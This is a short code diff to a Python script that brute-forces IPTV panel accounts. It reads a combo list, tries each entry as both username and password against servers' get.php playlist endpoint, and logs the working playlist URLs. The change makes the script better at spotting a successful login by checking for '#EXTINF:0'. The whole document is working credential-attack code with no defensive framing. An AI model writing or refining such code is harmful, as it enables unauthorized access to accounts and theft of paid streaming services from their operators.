@@ -79,7 +79,7 @@ def bruteAccounts(urls,comboFile):
         for user in tqdm(open(comboFile, 'r').readlines()):
             try:
                 accountToTry = "http://%s/get.php?username=%s&password=%s&type=m3u&output=mpegts" %(url.strip(), user.strip(), user.strip())
-                if len(get(accountToTry, timeout=5, stream=True).text) >= 2:
+                if "#EXTINF:0" in get(accountToTry, timeout=5, stream=True).text:
                     print "[+] Playlist URL found: %s" %(accountToTry)
                     f = open("logs.txt", "w")
                     f.write("%s\n" %(accountToTry))
